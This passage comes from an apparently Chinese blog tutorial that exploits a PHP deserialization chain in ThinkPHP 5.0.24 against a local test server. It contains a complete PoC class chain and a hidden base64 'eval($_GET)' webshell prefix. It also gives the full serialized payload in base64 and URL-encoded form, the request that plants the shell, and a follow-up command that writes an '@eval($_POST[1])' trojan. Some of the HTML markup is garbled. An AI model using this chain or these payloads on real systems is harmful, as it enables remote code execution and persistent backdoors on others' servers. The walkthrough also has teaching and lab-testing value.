class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Merge</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Merge</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string single-quoted-string\">'bb'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'getError'</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">error</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation<span class=\"token punctuation\">\\</span>BelongsTo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Output</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'removeWhereField'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcache</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BelongsTo</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcache</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcached</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string single-quoted-string\">'expire'</span>        <span class=\"token operator\">=&gt;</span> <span class=\"token number\">3600</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'cache_subdir'</span>  <span class=\"token operator\">=&gt;</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'prefix'</span>        <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'data_compress'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'path'</span>          <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'php://filter/convert.base64-decode/resource=./'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcached</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string single-quoted-string\">'expire'</span>   <span class=\"token operator\">=&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'prefix'</span>   <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>(直接在本地启动Apache 服务,创建一个php文件,然后把poc粘贴进去,之后访问该php,然后就会输出base64编码的序列化字符串) (如果还不知道咋用请做完攻防世界web-10 与攻防世界web-13这俩题)<br/> base64编码的序列化字符串</p>\n<pre><code class=\"prism language-php\">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ<span class=\"token operator\">==</span>\n</code></pre>\n<p>序列化字符串(由于base64解码之后,序列化字符串中有00截断符,我们的粘贴板遇到00截断符,就不粘贴了,我们需要用url编码一下把00截断符弄成%00)</p>\n<pre><code>%4f%3a%32%37%3a%22%74%68%69%6e%6b%5c%70%72%6f%63%65%73%73%5c%70%69%70%65%73%5c%57%69%6e%64%6f%77%73%22%3a%31%3a%7b%73%3a%33%34%3a%22%00%74%68%69%6e%6b%5c%70%72%6f%63%65%73%73%5c%70%69%70%65%73%5c%57%69%6e%64%6f%77%73%00%66%69%6c%65%73%22%3b%61%3a%31%3a%7b%69%3a%30%3b%4f%3a%31%37%3a%22%74%68%69%6e%6b%5c%6d%6f%64%65%6c%5c%4d%65%72%67%65%22%3a%32%3a%7b%73%3a%39%3a%22%00%2a%00%61%70%70%65%6e%64%22%3b%61%3a%31%3a%7b%73%3a%32%3a%22%62%62%22%3b%73%3a%38%3a%22%67%65%74%45%72%72%6f%72%22%3b%7d%73%3a%38%3a%22%00%2a%00%65%72%72%6f%72%22%3b%4f%3a%33%30%3a%22%74%68%69%6e%6b%5c%6d%6f%64%65%6c%5c%72%65%6c%61%74%69%6f%6e%5c%42%65%6c%6f%6e%67%73%54%6f%22%3a%31%3a%7b%73%3a%38%3a%22%00%2a%00%71%75%65%72%79%22%3b%4f%3a%32%30%3a%22%74%68%69%6e%6b%5c%63%6f%6e%73%6f%6c%65%5c%4f%75%74%70%75%74%22%3a%32%3a%7b%73%3a%39%3a%22%00%2a%00%73%74%79%6c%65%73%22%3b%61%3a%31%3a%7b%69%3a%30%3b%73%3a%31%36%3a%22%72%65%6d%6f%76%65%57%68%65%72%65%46%69%65%6c%64%22%3b%7d%73%3a%32%38%3a%22%00%74%68%69%6e%6b%5c%63%6f%6e%73%6f%6c%65%5c%4f%75%74%70%75%74%00%68%61%6e%64%6c%65%22%3b%4f%3a%32%39%3a%22%74%68%69%6e%6b%5c%73%65%73%73%69%6f%6e%5c%64%72%69%76%65%72%5c%4d%65%6d%63%61%63%68%65%22%3a%31%3a%7b%73%3a%31%30%3a%22%00%2a%00%68%61%6e%64%6c%65%72%22%3b%4f%3a%32%38%3a%22%74%68%69%6e%6b%5c%63%61%63%68%65%5c%64%72%69%76%65%72%5c%4d%65%6d%63%61%63%68%65%64%22%3a%33%3a%7b%73%3a%36%3a%22%00%2a%00%74%61%67%22%3b%62%3a%31%3b%73%3a%31%30%3a%22%00%2a%00%6f%70%74%69%6f%6e%73%22%3b%61%3a%32%3a%7b%73%3a%36%3a%22%65%78%70%69%72%65%22%3b%69%3a%30%3b%73%3a%36%3a%22%70%72%65%66%69%78%22%3b%73%3a%33%35%3a%22%50%44%39%77%61%48%41%4b%5a%58%5a%68%62%43%67%6b%58%30%64%46%56%46%73%6e%59%53%64%64%4b%54%73%4b%50%7a%34%22%3b%7d%73%3a%31%30%3a%22%00%2a%00%68%61%6e%64%6c%65%72%22%3b%4f%3a%32%33%3a%22%74%68%69%6e%6b%5c%63%61%63%68%65%5c%64%72%69%76%65%72%5c%46%69%6c%65%22%3a%32%3a%7b%73%3a%36%3a%22%00%2a%00%74%61%67%22%3b%62%3a%30%3b%73%3a%31%30%3a%22%00%2a%00%6f%70%74%69%6f%6e%73%22%3b%61%3a%35%3a%7b%73%3a%36%3a%22%65%78%70%69%72%65%22%3b%69%3a%33%36%30%30%3b%73%3a%31%32%3a%22%63%61%63%68%65%5f%73%75%62%64%69%72%22%3b%62%3a%30%3b%73%3a%36%3a%22%70%72%65%66%69%78%22%3b%73%3a%30%3a%22%22%3b%73%3a%31%33%3a%22%64%61%74%61%5f%63%6f%6d%70%72%65%73%73%22%3b%62%3a%30%3b%73%3a%34%3a%22%70%61%74%68%22%3b%73%3a%34%36%3a%22%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%2e%2f%22%3b%7d%7d%7d%7d%7d%7d%7d%7d%7d\n</code></pre>\n<p>![image.png](https://img-blog.csdnimg.cn/img_convert/cbd75be86418188645fc76c7fa8eb703.png#clientId=u97f00251-c332-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=607&amp;id=ua1337fe7&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=759&amp;originWidth=1546&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=198754&amp;status=done&amp;style=none&amp;taskId=udca48404-953c-490c-902e-cb8de8f93b9&amp;title=&amp;width=1236.8)<br/> <img alt=\"image.png\" src=\"image\\86d4ba6fa051bfe5348394e8b04b6cfa.png#clientId=u97f00251-c332-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=309&amp;id=u19702fc0&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> (本例构造的环境是解码base64,因此咱们用base64的那个就行)</p>\n<p>okk,接着咱们传参<a href=\"http://127.0.0.1/thinkPHP5.0.24/public/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ==\">http://127.0.0.1/thinkPHP5.0.24/public/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ==</a></p>\n<p>传完之后<br/> <img alt=\"image.png\" src=\"image\\aa62aab2d1b468814f207de5e85b17c3.png#clientId=u97f00251-c332-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=864&amp;id=u55db7423&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/><br/> 在当前目录生成两个文件<br/> 8fba8bb6410a4aee90b063a8b7e78b73.php<br/> 963334a0506b44761722280d21785469.php</p>\n<p>咱们访问8fba8bb6410a4aee90b063a8b7e78b73.php<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/9931ad78d399db29889c815376895a18.png#clientId=u97f00251-c332-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=70&amp;id=u3a82bab3&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=88&amp;originWidth=486&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9493&amp;status=done&amp;style=none&amp;taskId=ue0e8146d-fb2c-4b19-9f3d-664ba2dc579&amp;title=&amp;width=388.8)<br/> (参数a可用)<br/> <a href=\"http://127.0.0.1/thinkPHP5.0.24/public/8fba8bb6410a4aee90b063a8b7e78b73.php?a=phpinfo%28%29;\">http://127.0.0.1/thinkPHP5.0.24/public/8fba8bb6410a4aee90b063a8b7e78b73.php?a=phpinfo();</a><br/> <img alt=\"image.png\" src=\"image\\862c876944ecfbefd81c178202fb4b68.png#clientId=u97f00251-c332-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=658&amp;id=ufaa36910&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<p>写入木马<br/> [http://127.0.0.1/thinkPHP5.0.24/public/8fba8bb6410a4aee90b063a8b7e78b73.php?a=file_put_contents(%27leyu.php%27,%27%3C?php%20@eval(<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        \n        \n         P\n        \n       \n       \n        O\n       \n       \n        S\n       \n       \n        T\n       \n       \n        [\n       \n       \n        1\n       \n       \n        ]\n       \n       \n        )\n       \n       \n        ?\n       \n      \n      \n       _POST[1])?%3E%27,FILE_APPEND);](http://127.0.0.1/thinkPHP5.0.24/public/8fba8bb6410a4aee90b063a8b7e78b73.php?a=file_put_contents(%27leyu.php%27,%27%3C?php%20@eval(\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\"><span class=\"\"></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.328331em;\"><span class=\"\" style=\"top: -2.55em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mclose\">]</span><span class=\"mclose\">)</span><span class=\"mclose\">?</span></span></span></span></span>_POST[1])?%3E%27,FILE_APPEND)😉</p>\n<p><img alt=\"image.png\" src=\"image\\0413465d355e3bcdea2f07f1774190da.png#clientId=u81f48db3-6d51-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=671&amp;id=u83f9d6c4&amp;margin=%5BobjectObject%5D&amp;name=image.png\"/></p>\n<h1><a id=\"_369\"></a></h1>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}